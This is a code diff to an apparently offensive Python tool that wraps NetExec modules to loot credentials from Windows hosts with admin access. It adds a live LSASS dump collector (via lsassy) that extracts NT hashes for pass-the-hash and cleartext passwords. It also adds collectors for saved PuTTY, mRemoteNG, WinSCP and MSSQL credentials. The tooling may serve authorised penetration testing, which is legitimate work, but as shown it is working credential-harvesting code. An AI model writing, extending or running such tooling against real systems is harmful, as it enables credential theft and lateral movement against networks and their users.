@@ -1,5 +1,6 @@
-"""Loot that NetExec (nxc) modules do well: VNC, PowerShell history, SCCM,
-autologon, event-log creds, Veeam. Run once per host with an admin credential."""
+"""Loot that NetExec (nxc) modules do well: VNC, PowerShell history, autologon,
+event-log creds, Veeam, live LSASS, PuTTY/mRemoteNG/WinSCP, MSSQL. Run once per
+host with an admin credential (MSSQL needs 1433)."""
 from __future__ import annotations
 
 import re
@@ -72,17 +73,25 @@ class PSHistoryCollector(_NxcModule):
         return found
 
 
-class SccmCollector(_NxcModule):
-    name = "SCCM"; source = "SCCM"; module = "sccm"
-    description = "SCCM Network Access Account / policy secrets"
+class LsassCollector(_NxcModule):
+    name = "LSASS"; source = "LSASS"; module = "lsassy"
+    description = "Live LSASS dump (logged-on users' hashes/cleartext)"
+
+    LINE = re.compile(r"^([^\s\\/]+[\\/][^\s]+)\s+([0-9a-fA-F]{32}|\S+)$")
 
     def _parse(self, out: str) -> List[Secret]:
         found = []
         for msg in self._messages(out):
-            m = re.search(r"(user|account)[:\s]+(\S+).*?(pass|secret)[:\s]+(\S+)", msg, re.I)
-            if m:
-                found.append(Secret(self.host, "SCCM", m.group(2), m.group(4),
-                                    Status.CLEARTEXT, secret_type="password"))
+            m = self.LINE.match(msg.strip())
+            if not m:
+                continue
+            user, sec = m.group(1), m.group(2)
+            if re.fullmatch(r"[0-9a-fA-F]{32}", sec):
+                found.append(Secret(self.host, "LSASS", user, sec, Status.HASH,
+                                    secret_type="nthash", notes="from LSASS; PtH"))
+            else:
+                found.append(Secret(self.host, "LSASS", user, sec, Status.CLEARTEXT,
+                                    secret_type="password", notes="cleartext from LSASS"))
         return found
 
 
@@ -117,3 +126,25 @@ class EventlogCollector(_UserPassNxc):
 class VeeamCollector(_UserPassNxc):
     name = "Veeam"; source = "Veeam"; module = "veeam"
     description = "Veeam Backup stored credentials"
+
+
+class PuttyCollector(_UserPassNxc):
+    name = "PuTTY"; source = "PuTTY"; module = "putty"
+    description = "PuTTY stored sessions / proxy credentials"
+
+
+class MremotengCollector(_UserPassNxc):
+    name = "mRemoteNG"; source = "mRemoteNG"; module = "mremoteng"
+    description = "mRemoteNG saved connection credentials"
+
+
+class WinscpCollector(_UserPassNxc):
+    name = "WinSCP"; source = "WinSCP"; module = "winscp"
+    description = "WinSCP saved session credentials"
+
+
+class MssqlCollector(_UserPassNxc):
+    name = "MSSQL"; source = "MSSQL"; module = "mssql_priv"
+    proto = "mssql"
+    needs_mssql = True        # auto-skip unless 1433 is open
+    description = "MSSQL access / privilege + stored logins"
